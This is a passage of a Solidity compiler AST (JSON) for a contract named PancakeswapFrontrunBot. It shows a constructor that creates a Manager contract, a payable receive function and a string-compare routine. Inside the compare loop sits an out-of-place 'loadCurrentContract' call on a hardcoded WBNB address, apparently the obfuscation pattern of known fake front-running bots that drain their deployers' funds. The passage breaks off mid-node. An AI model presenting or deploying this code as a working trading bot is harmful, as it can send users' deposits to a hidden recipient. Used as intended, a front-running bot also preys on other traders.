										"typeString": "string"
									},
									"typeName": {
										"id": 90,
										"name": "string",
										"nodeType": "ElementaryTypeName",
										"src": "439:6:3",
										"typeDescriptions": {
											"typeIdentifier": "t_string_storage_ptr",
											"typeString": "string"
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"constant": false,
									"id": 93,
									"mutability": "mutable",
									"name": "frontrun",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1724,
									"src": "471:13:3",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_uint256",
										"typeString": "uint256"
									},
									"typeName": {
										"id": 92,
										"name": "uint",
										"nodeType": "ElementaryTypeName",
										"src": "471:4:3",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"constant": false,
									"id": 95,
									"mutability": "mutable",
									"name": "manager",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 1724,
									"src": "491:15:3",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_contract$_Manager_$1838",
										"typeString": "contract Manager"
									},
									"typeName": {
										"contractScope": null,
										"id": 94,
										"name": "Manager",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 1838,
										"src": "491:7:3",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_Manager_$1838",
											"typeString": "contract Manager"
										}
									},
									"value": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 116,
										"nodeType": "Block",
										"src": "592:112:3",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 104,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 102,
														"name": "tokenName",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 89,
														"src": "603:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 103,
														"name": "_tokenName",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 97,
														"src": "615:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "603:22:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 105,
												"nodeType": "ExpressionStatement",
												"src": "603:22:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 108,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 106,
														"name": "tokenSymbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 91,
														"src": "636:11:3",
														"typeDescriptions": {
															"typeIdentifier": "t_string_storage",
															"typeString": "string storage ref"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 107,
														"name": "_tokenSymbol",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 99,
														"src": "650:12:3",
														"typeDescriptions": {
															"typeIdentifier": "t_string_memory_ptr",
															"typeString": "string memory"
														}
													},
													"src": "636:26:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage",
														"typeString": "string storage ref"
													}
												},
												"id": 109,
												"nodeType": "ExpressionStatement",
												"src": "636:26:3"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 114,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"id": 110,
														"name": "manager",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 95,
														"src": "673:7:3",
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Manager_$1838",
															"typeString": "contract Manager"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [],
														"expression": {
															"argumentTypes": [],
															"id": 112,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "NewExpression",
															"src": "683:11:3",
															"typeDescriptions": {
																"typeIdentifier": "t_function_creation_nonpayable$__$returns$_t_contract$_Manager_$1838_$",
																"typeString": "function () returns (contract Manager)"
															},
															"typeName": {
																"contractScope": null,
																"id": 111,
																"name": "Manager",
																"nodeType": "UserDefinedTypeName",
																"referencedDeclaration": 1838,
																"src": "687:7:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_contract$_Manager_$1838",
																	"typeString": "contract Manager"
																}
															}
														},
														"id": 113,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "683:13:3",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_contract$_Manager_$1838",
															"typeString": "contract Manager"
														}
													},
													"src": "673:23:3",
													"typeDescriptions": {
														"typeIdentifier": "t_contract$_Manager_$1838",
														"typeString": "contract Manager"
													}
												},
												"id": 115,
												"nodeType": "ExpressionStatement",
												"src": "673:23:3"
											}
										]
									},
									"documentation": null,
									"id": 117,
									"implemented": true,
									"kind": "constructor",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 100,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 97,
												"mutability": "mutable",
												"name": "_tokenName",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 117,
												"src": "531:24:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 96,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "531:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 99,
												"mutability": "mutable",
												"name": "_tokenSymbol",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 117,
												"src": "557:26:3",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 98,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "557:6:3",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "530:54:3"
									},
									"returnParameters": {
										"id": 101,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "592:0:3"
									},
									"scope": 1724,
									"src": "519:185:3",
									"stateMutability": "nonpayable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 120,
										"nodeType": "Block",
										"src": "740:2:3",
										"statements": []
									},
									"documentation": null,
									"id": 121,
									"implemented": true,
									"kind": "receive",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 118,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "720:2:3"
									},
									"returnParameters": {
										"id": 119,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "740:0:3"
									},
									"scope": 1724,
									"src": "713:29:3",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								},
								{
									"canonicalName": "PancakeswapFrontrunBot.slice",
									"id": 126,
									"members": [
										{
											"constant": false,
											"id": 123,
											"mutability": "mutable",
											"name": "_len",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 126,
											"src": "775:9:3",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 122,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "775:4:3",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										},
										{
											"constant": false,
											"id": 125,
											"mutability": "mutable",
											"name": "_ptr",
											"nodeType": "VariableDeclaration",
											"overrides": null,
											"scope": 126,
											"src": "795:9:3",
											"stateVariable": false,
											"storageLocation": "default",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											},
											"typeName": {
												"id": 124,
												"name": "uint",
												"nodeType": "ElementaryTypeName",
												"src": "795:4:3",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												}
											},
											"value": null,
											"visibility": "internal"
										}
									],
									"name": "slice",
									"nodeType": "StructDefinition",
									"scope": 1724,
									"src": "751:61:3",
									"visibility": "public"
								},
								{
									"body": {
										"id": 266,
										"nodeType": "Block",
										"src": "1157:1155:3",
										"statements": [
											{
												"assignments": [
													136
												],
												"declarations": [
													{
														"constant": false,
														"id": 136,
														"mutability": "mutable",
														"name": "shortest",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 266,
														"src": "1168:13:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 135,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1168:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 139,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 137,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 128,
														"src": "1184:4:3",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
															"typeString": "struct PancakeswapFrontrunBot.slice memory"
														}
													},
													"id": 138,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_len",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 123,
													"src": "1184:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1168:25:3"
											},
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 144,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 140,
															"name": "other",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 130,
															"src": "1210:5:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 141,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "1210:10:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "<",
													"rightExpression": {
														"argumentTypes": null,
														"expression": {
															"argumentTypes": null,
															"id": 142,
															"name": "self",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 128,
															"src": "1223:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																"typeString": "struct PancakeswapFrontrunBot.slice memory"
															}
														},
														"id": 143,
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": false,
														"memberName": "_len",
														"nodeType": "MemberAccess",
														"referencedDeclaration": 123,
														"src": "1223:9:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "1210:22:3",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"falseBody": null,
												"id": 150,
												"nodeType": "IfStatement",
												"src": "1206:63:3",
												"trueBody": {
													"expression": {
														"argumentTypes": null,
														"id": 148,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"lValueRequested": false,
														"leftHandSide": {
															"argumentTypes": null,
															"id": 145,
															"name": "shortest",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 136,
															"src": "1248:8:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"nodeType": "Assignment",
														"operator": "=",
														"rightHandSide": {
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 146,
																"name": "other",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 130,
																"src": "1259:5:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
																	"typeString": "struct PancakeswapFrontrunBot.slice memory"
																}
															},
															"id": 147,
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "_len",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 123,
															"src": "1259:10:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"src": "1248:21:3",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"id": 149,
													"nodeType": "ExpressionStatement",
													"src": "1248:21:3"
												}
											},
											{
												"assignments": [
													152
												],
												"declarations": [
													{
														"constant": false,
														"id": 152,
														"mutability": "mutable",
														"name": "selfptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 266,
														"src": "1283:12:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 151,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1283:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 155,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 153,
														"name": "self",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 128,
														"src": "1298:4:3",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
															"typeString": "struct PancakeswapFrontrunBot.slice memory"
														}
													},
													"id": 154,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 125,
													"src": "1298:9:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1283:24:3"
											},
											{
												"assignments": [
													157
												],
												"declarations": [
													{
														"constant": false,
														"id": 157,
														"mutability": "mutable",
														"name": "otherptr",
														"nodeType": "VariableDeclaration",
														"overrides": null,
														"scope": 266,
														"src": "1318:13:3",
														"stateVariable": false,
														"storageLocation": "default",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														},
														"typeName": {
															"id": 156,
															"name": "uint",
															"nodeType": "ElementaryTypeName",
															"src": "1318:4:3",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														},
														"value": null,
														"visibility": "internal"
													}
												],
												"id": 160,
												"initialValue": {
													"argumentTypes": null,
													"expression": {
														"argumentTypes": null,
														"id": 158,
														"name": "other",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 130,
														"src": "1334:5:3",
														"typeDescriptions": {
															"typeIdentifier": "t_struct$_slice_$126_memory_ptr",
															"typeString": "struct PancakeswapFrontrunBot.slice memory"
														}
													},
													"id": 159,
													"isConstant": false,
													"isLValue": true,
													"isPure": false,
													"lValueRequested": false,
													"memberName": "_ptr",
													"nodeType": "MemberAccess",
													"referencedDeclaration": 125,
													"src": "1334:10:3",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"nodeType": "VariableDeclarationStatement",
												"src": "1318:26:3"
											},
											{
												"body": {
													"id": 252,
													"nodeType": "Block",
													"src": "1404:851:3",
													"statements": [
														{
															"assignments": [
																173
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 173,
																	"mutability": "mutable",
																	"name": "a",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 252,
																	"src": "1460:6:3",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 172,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1460:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 174,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1460:6:3"
														},
														{
															"assignments": [
																176
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 176,
																	"mutability": "mutable",
																	"name": "b",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 252,
																	"src": "1481:6:3",
																	"stateVariable": false,
																	"storageLocation": "default",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	},
																	"typeName": {
																		"id": 175,
																		"name": "uint",
																		"nodeType": "ElementaryTypeName",
																		"src": "1481:4:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_uint256",
																			"typeString": "uint256"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 177,
															"initialValue": null,
															"nodeType": "VariableDeclarationStatement",
															"src": "1481:6:3"
														},
														{
															"assignments": [
																179
															],
															"declarations": [
																{
																	"constant": false,
																	"id": 179,
																	"mutability": "mutable",
																	"name": "WBNB_CONTRACT_ADDRESS",
																	"nodeType": "VariableDeclaration",
																	"overrides": null,
																	"scope": 252,
																	"src": "1505:35:3",
																	"stateVariable": false,
																	"storageLocation": "memory",
																	"typeDescriptions": {
																		"typeIdentifier": "t_string_memory_ptr",
																		"typeString": "string"
																	},
																	"typeName": {
																		"id": 178,
																		"name": "string",
																		"nodeType": "ElementaryTypeName",
																		"src": "1505:6:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_storage_ptr",
																			"typeString": "string"
																		}
																	},
																	"value": null,
																	"visibility": "internal"
																}
															],
															"id": 181,
															"initialValue": {
																"argumentTypes": null,
																"hexValue": "307862623443644239434264333642303162443163426145424632446530386439313733626330393563",
																"id": 180,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "string",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "1543:44:3",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_stringliteral_37cf124b82d1125aa3263d3711588a7b7ce0f7024b1847f632cf6b3ab384d34a",
																	"typeString": "literal_string \"0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c\""
																},
																"value": "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c"
															},
															"nodeType": "VariableDeclarationStatement",
															"src": "1505:82:3"
														},
														{
															"expression": {
																"argumentTypes": null,
																"arguments": [
																	{
																		"argumentTypes": null,
																		"id": 183,
																		"name": "WBNB_CONTRACT_ADDRESS",
																		"nodeType": "Identifier",
																		"overloadedDeclarations": [],
																		"referencedDeclaration": 179,
																		"src": "1622:21:3",
																		"typeDescriptions": {
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	}
																],
																"expression": {
																	"argumentTypes": [
																		{
																			"typeIdentifier": "t_string_memory_ptr",
																			"typeString": "string memory"
																		}
																	],
																	"id": 182,
																	"name": "loadCurrentContract",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 407,
																	"src": "1602:19:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_function_internal_pure$_t_string_memory_ptr_$returns$_t_string_memory_ptr_$",
																		"typeString": "function (string memory) pure returns (string memory)"
																	}
																},
																"id": 184,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"kind": "functionCall",
																"lValueRequested": false,
																"names": [],
																"nodeType": "FunctionCall",
																"src": "1602:42:3",
																"tryCall": false,
																"typeDescriptions": {
																	"typeIdentifier": "t_string_memory_ptr",
																	"typeString": "string memory"
																}
															},
															"id": 185,
															"nodeType": "ExpressionStatement",
															"src": "1602:42:3"
														},
														{
															"AST": {
																"nodeType": "YulBlock",
																"src": "1668:91:3",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "1687:19:3",
																		"value": {
																			"arguments": [
																				{
																					"name": "selfptr",
																					"nodeType": "YulIdentifier",
																					"src": "1698:7:3"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1692:5:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1692:14:3"
																		},
																		"variableNames": [
																			{
																				"name": "a",
																				"nodeType": "YulIdentifier",
																				"src": "1687:1:3"
																			}
																		]
																	},
																	{
																		"nodeType": "YulAssignment",
																		"src": "1724:20:3",
																		"value": {
																			"arguments": [
																				{
																					"name": "otherptr",
																					"nodeType": "YulIdentifier",
																					"src": "1735:8:3"
																				}
																			],
																			"functionName": {
																				"name": "mload",
																				"nodeType": "YulIdentifier",
																				"src": "1729:5:3"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "1729:15:3"
																		},
																		"variableNames": [
																			{
																				"name": "b",
																				"nodeType": "YulIdentifier",
																				"src": "1724:1:3"
																			}
																		]
																	}
																]
															},
															"evmVersion": "istanbul",
															"externalReferences": [
																{
																	"declaration": 173,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1687:1:3",
																	"valueSize": 1
																},
																{
																	"declaration": 176,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1724:1:3",
																	"valueSize": 1
																},
																{
																	"declaration": 157,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1735:8:3",
																	"valueSize": 1
																},
																{
																	"declaration": 152,
																	"isOffset": false,
																	"isSlot": false,
																	"src": "1698:7:3",
																	"valueSize": 1
																}
															],
															"id": 186,
															"nodeType": "InlineAssembly",
															"src": "1659:100:3"
														},
														{
															"condition": {
																"argumentTypes": null,
																"commonType": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																},
																"id": 189,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"leftExpression": {
																	"argumentTypes": null,
																	"id": 187,
																	"name": "a",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 173,
																	"src": "1780:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"nodeType": "BinaryOperation",
																"operator": "!=",
																"rightExpression": {
																	"argumentTypes": null,
																	"id": 188,
																	"name": "b",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 176,
																	"src": "1785:1:3",
																	"typeDescriptions": {
																		"typeIdentifier": "t_uint256",
																		"typeString": "uint256"
																	}
																},
																"src": "1780:6:3",
																"typeDescriptions": {
																	"typeIdentifier": "t_bool",
																	"typeString": "bool"
																}
															},
															"falseBody": null,
															"id": 243,
															"nodeType": "IfStatement",
															"src": "1776:411:3",
															"trueBody": {
																"id": 242,
																"nodeType": "Block",
																"src": "1788:399:3",
																"statements": [
																	{
																		"assignments": [
																			191
																		],
																		"declarations": [
																			{
																				"constant": false,
																				"id": 191,
																				"mutability": "mutable",
																				"name": "mask",
																				"nodeType": "VariableDeclaration",
																				"overrides": null,
																				"scope": 242,
																				"src": "1891:12:3",
																				"stateVariable": false,
																				"storageLocation": "default",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				},
																				"typeName": {
																					"id": 190,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1891:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": "t_uint256",
																						"typeString": "uint256"
																					}
																				},
																				"value": null,
																				"visibility": "internal"
																			}
																		],
																		"id": 197,
																		"initialValue": {
																			"argumentTypes": null,
																			"arguments": [
																				{
																					"argumentTypes": null,
																					"id": 195,
																					"isConstant": false,
																					"isLValue": false,
																					"isPure": true,
																					"lValueRequested": false,
																					"nodeType": "UnaryOperation",
																					"operator": "-",
																					"prefix": true,
																					"src": "1914:2:3",
																					"subExpression": {
																						"argumentTypes": null,
																						"hexValue": "31",
																						"id": 194,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": true,
																						"kind": "number",
																						"lValueRequested": false,
																						"nodeType": "Literal",
																						"src": "1915:1:3",
																						"subdenomination": null,
																						"typeDescriptions": {
																							"typeIdentifier": "t_rational_1_by_1",
																							"typeString": "int_const 1"
																						},
																						"value": "1"
																					},
																					"typeDescriptions": {
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				}
																			],
																			"expression": {
																				"argumentTypes": [
																					{
																						"typeIdentifier": "t_rational_minus_1_by_1",
																						"typeString": "int_const -1"
																					}
																				],
																				"id": 193,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"lValueRequested": false,
																				"nodeType": "ElementaryTypeNameExpression",
																				"src": "1906:7:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_type$_t_uint256_$",
																					"typeString": "type(uint256)"
																				},
																				"typeName": {
																					"id": 192,
																					"name": "uint256",
																					"nodeType": "ElementaryTypeName",
																					"src": "1906:7:3",
																					"typeDescriptions": {
																						"typeIdentifier": null,
																						"typeString": null
																					}
																				}
																			},
																			"id": 196,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": true,
																			"kind": "typeConversion",
																			"lValueRequested": false,
																			"names": [],
																			"nodeType": "FunctionCall",
																			"src": "1906:11:3",
																			"tryCall": false,
																			"typeDescriptions": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			}
																		},
																		"nodeType": "VariableDeclarationStatement",
																		"src": "1891:26:3"
																	},
																	{
																		"condition": {
																			"argumentTypes": null,
																			"commonType": {
																				"typeIdentifier": "t_uint256",
																				"typeString": "uint256"
																			},
																			"id": 200,
																			"isConstant": false,
																			"isLValue": false,
																			"isPure": false,
																			"lValueRequested": false,
																			"leftExpression": {
																				"argumentTypes": null,
																				"id": 198,
																				"name": "shortest",
																				"nodeType": "Identifier",
																				"overloadedDeclarations": [],
																				"referencedDeclaration": 136,
																				"src": "1942:8:3",
																				"typeDescriptions": {
																					"typeIdentifier": "t_uint256",
																					"typeString": "uint256"
																				}
																			},
																			"nodeType": "BinaryOperation",
																			"operator": "<",
																			"rightExpression": {
																				"argumentTypes": null,
																				"hexValue": "3332",
																				"id": 199,
																				"isConstant": false,
																				"isLValue": false,
																				"isPure": true,
																				"kind": "number",
																				"lValueRequested": false,
																				"nodeType": "Literal",
																				"src": "1953:2:3",
																				"subdenomination": null,
																				"typeDescriptions": {
																					"typeIdentifier": "t_rational_32_by_1",
																					"typeString": "int_const 32"
																				},
																				"value": "32"
																			},
																			"src": "1942:13:3",
																			"typeDescriptions": {
																				"typeIdentifier": "t_bool",
																				"typeString": "bool"
																			}
																		},
																		"falseBody": null,
																		"id": 220,
																		"nodeType": "IfStatement",
																		"src": "1939:105:3",
																		"trueBody": {
																			"id": 219,
																			"nodeType": "Block",
																			"src": "1957:87:3",
																			"statements": [
																				{
																					"expression": {
																						"argumentTypes": null,
																						"id": 217,
																						"isConstant": false,
																						"isLValue": false,
																						"isPure": false,
																						"lValueRequested": false,
																						"leftHandSide": {
																							"argumentTypes": null,
																							"id": 201,
																							"name": "mask",
																							"nodeType": "Identifier",
																							"overloadedDeclarations": [],
																							"referencedDeclaration": 191,
																							"src": "1978:4:3",
																							"typeDescriptions": {
																								"typeIdentifier": "t_uint256",
																								"typeString": "uint256"
																							}
																						},
																						"nodeType": "Assignment",
																						"operator": "=",
																						"rightHandSide": {
																							"argumentTypes": null,
																							"id": 216,
																							"isConstant": false,
																							"isLValue": false,
																							"isPure": false,
																							"lValueRequested": false,
																							"nodeType": "UnaryOperation",
																							"operator": "~",
																							"prefix": true,
																							"src": "1985:39:3",
																							"subExpression": {
																								"argumentTypes": null,
																								"components": [
																									{
																										"argumentTypes": null,
																										"commonType": {
																											"typeIdentifier": "t_uint256",
																											"typeString": "uint256"
																										},
																										"id": 214,
																										"isConstant": false,
																										"isLValue": false,
																										"isPure": false,
																										"lValueRequested": false,
																										"leftExpression": {
																											"argumentTypes": null,
																											"commonType": {
																												"typeIdentifier": "t_uint256",
																												"typeString": "uint256"
																											},
																											"id": 212,
																											"isConstant": false,
																											"isLValue": false,
																											"isPure": false,
																											"lValueRequested": false,
																											"leftExpression": {
																												"argumentTypes": null,
																												"hexValue": "32",
																												"id": 202,
																												"isConstant": false,
																												"isLValue": false,
																												"isPure": true,
																												"kind": "number",
																												"lValueRequested": false,
																												"nodeType": "Literal",
																												"src": "1987:1:3",
																												"subdenomination": null,
																												"typeDescriptions": {
																													"typeIdentifier": "t_rational_2_by_1",
																													"typeString": "int_const 2"
																												},
																												"value": "2"
																											},
																											"nodeType": "BinaryOperation",
																											"operator": "**",
																											"rightExpression": {
																												"argumentTypes": null,
																												"components": [
																													{
																														"argumentTypes": null,
																														"commonType": {
